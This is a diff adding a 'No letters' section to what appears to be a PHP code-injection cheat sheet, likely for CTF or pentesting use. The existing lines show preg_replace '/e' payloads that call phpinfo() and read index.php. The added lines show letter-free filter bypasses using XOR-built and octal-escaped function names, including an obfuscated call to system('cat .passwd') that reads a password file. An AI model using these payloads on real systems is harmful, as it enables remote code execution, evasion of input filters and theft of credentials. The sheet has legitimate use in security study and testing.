@@ -43,3 +43,18 @@ preg_replace("Replace that", "with that", "from that")
 preg_replace("/a/e",phpinfo(),"whatever")
 preg_replace("/a/e",file_get_contents("./index.php"),"whatever")
 ```
+
+
+## No letters
+
+### Using XOR technics
+Concatenate letter by letter
+```php
+('('^'[') . ('$'^']') ...
+```
+
+### Using octal
+```php
+("\160\150\160\151\156\146\157")() // ("phpinfo")() = phpinfo()
+("\163\171\163\164\145\155")("\143\141\164\40\56\160\141\163\163\167\144") // ("system")("cat .passwd")
+```
